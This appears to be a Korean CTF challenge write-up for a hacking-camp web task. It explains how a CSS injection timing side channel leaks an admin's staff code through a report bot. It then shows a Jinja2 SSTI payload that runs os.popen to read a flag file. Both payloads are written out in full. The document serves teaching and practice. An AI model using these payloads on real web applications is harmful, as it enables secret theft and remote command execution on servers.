# STAFF_ONLY 
## SISS Web Summer 31회 해킹캠프 - 최종 시나리오

## 문제 설명
기다리던 콘서트 예매가 드디어 시작됐다.  
그런데 무대 앞줄이 스탭 전용이라고??  
하지만 무대 앞 시야를 포기할 순 없다!  
스탭의 자리를 빼앗을 수밖에....

---
## 목표
1. css injection으로 staff_code 얻음
2. staff_code로 /list에 접근 후 SSTI를 이용해서 최종 플래그 탈취
   
관리자 계정에만 존재하는 **16자리 staff_code**를 알아내고 이를 이용해 스탭 전용 페이지에 접근한 뒤 최종 flag를 획득해야합니다

- Index 페이지: 좌석 선택 및 `optional` 입력 가능
- MyPage 페이지: 구매 티켓 확인 (단, staff_code가 있을 경우에만 `<input id="staff_code">` 렌더링) , Index에서 입력한 optional이 티켓의 style로 적용됨 
- Report 페이지: 관리자가 유저가 제출한 경로(`/mypage?ticket_id=xx`)를 열람하도록 함
- List 페이지: staff_code가 있어야 접근 가능 
---
## 시나리오 설명 

### 1. css injection을 통해 staff_code 값 추출
<img width="1600" height="821" alt="스크린샷 2025-08-29 오전 10 14 30" src="https://github.com/user-attachments/assets/80775ccc-3997-42f4-92b5-4b471702787d" />

- `optional` 입력값이 `mypage`의 티켓의 CSS로 반영됨 > css injection임을 알 수 있음
- CSP로 인해 외부 요청은 차단되기 때문에  **CSS 렌더링 지연 기반 side-channel 공격**을 사용해야함
- `input#staff_code[value^=...]` 조건부 선택자를 이용해 prefix가 맞으면 css injection을 이용해서 의도적으로 크래쉬를 유발시키고 이로 인해서 브라우저 렌더링이 지연됨 (HINT:크래쉬는 타임아웃을 유발할 수 있습니다.)
- 참가자는 실행 시간의 차이로 value의 참/거짓을 판별함 


```css
blue;} input#staff_code[value^=a] {
    --a: url(/?1),url(/?1),url(/?1),url(/?1),url(/?1);
    --b: var(--a),var(--a),var(--a),var(--a),var(--a);
    --c: var(--b),var(--b),var(--b),var(--b),var(--b);
    --d: var(--c),var(--c),var(--c),var(--c),var(--c);
    --e: var(--d),var(--d),var(--d),var(--d),var(--d);
    --f: var(--e),var(--e),var(--e),var(--e),var(--e);
    --g: var(--f),var(--f),var(--f),var(--f),var(--f);
}
* { background-image: var(--g); }
```

### 2. Report 페이지 활용
- `/report` 기능을 이용해 관리자가 `/mypage?ticket_id=xx`를 열람하도록 유도 
- CSS 페이로드가 실행되면, **렌더링 시간(duration)** 차이로 조건이 맞는지 여부를 판별 가능   

<img width="1132" height="593" alt="스크린샷 2025-08-28 오전 3 04 58" src="https://github.com/user-attachments/assets/e949bbf2-72bb-4f81-8ca0-61ad79d20d3b" />

* value 값이 틀리다면(조건 불일치) 크래쉬 발생이 안 나기 때문에 지연도 없으므로 컴퓨터 환경에 따라 소요시간: 0.xx초 ~ 1.xx초 *
* 
<img width="1132" height="593" alt="스크린샷 2025-08-28 오전 9 44 13" src="https://github.com/user-attachments/assets/ea04e751-2d4d-41bd-8477-e1926a7ba2ba" />

* value 값이 맞다면(조건 일치) 크래쉬 발생으로 지연되므로 컴퓨터 환경에 따라 소요시간: 2.xx초 ~ 7.xx초 *

이 과정을 반복하는 자동화 스크립트를 만들면 staff_code의 각 문자를 순차적으로 추출할 수 있음

### 3. 최종 SSTI 익스플로잇
<img width="1423" height="936" alt="스크린샷 2025-08-30 오전 2 27 22" src="https://github.com/user-attachments/assets/7cb988fe-c0a8-4708-8b6c-9dc8d8155ed0" />

- /list는 staff_code가 있어야 접근 가능 /list?code=찾은스탭코드로 접근 시 밑처럼 페이지가 뜸 
<img width="1423" height="819" alt="스크린샷 2025-08-30 오전 2 28 36" src="https://github.com/user-attachments/assets/c7504be2-771a-471f-b010-00950449a51f" />

- /list는 SSTI 취약점이 존재하므로 motd 파라미터에 삽입하면 http://~/list?code=찾은스탭코드&motd={% print url_for.__globals__['os'].popen('cat flag.txt').read() %} 실행 시 flag 내용을 획득할 수 있음
<img width="1508" height="495" alt="스크린샷 2025-08-30 오전 12 29 19" src="https://github.com/user-attachments/assets/fef338c4-126e-473f-b0c8-d185b31136d4" />

